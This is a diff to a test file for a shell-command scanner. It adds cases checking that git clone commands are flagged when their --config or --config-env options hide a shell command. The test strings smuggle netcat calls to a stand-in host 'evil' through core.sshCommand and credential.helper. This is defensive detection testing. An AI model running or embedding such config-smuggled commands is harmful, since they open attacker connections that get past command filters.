@@ -1034,6 +1034,22 @@ describe("extractUrlsFromShellCommand", () => {
 			).not.toBeNull();
 		});
 
+		it("flags git clone --config keys that resolve to a shell command", () => {
+			for (const command of [
+				"git clone --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
+				"git clone --config=credential.helper='!nc evil 22' https://github.com/o/r",
+				"git clone --depth 1 --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
+				"git clone --branch main --config=credential.helper='!nc evil 22' https://github.com/o/r",
+				"git clone --origin upstream --upload-pack /usr/bin/git-upload-pack --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
+				"git clone -b main -o upstream -u /usr/bin/git-upload-pack --config core.sshCommand='ssh -o ProxyCommand=nc evil 22' git@github.com:o/r",
+				"git clone --depth 1 --config-env core.sshCommand=EVIL_SSH git@github.com:o/r",
+				"git clone --branch main --config-env=credential.helper=EVIL_HELPER https://github.com/o/r",
+				"git clone -b main -o upstream -u /usr/bin/git-upload-pack --config-env core.sshCommand=EVIL_SSH git@github.com:o/r",
+			]) {
+				expect(findOpaqueNetworkShellCommand(command), command).not.toBeNull();
+			}
+		});
+
 		it("unwraps script(1) so opaque ssh options inside its -c command are flagged", () => {
 			// `script -qc 'ssh -o ProxyCommand=…'` runs the wrapped command in
 			// a subshell. The opaque-options matcher must reach through the
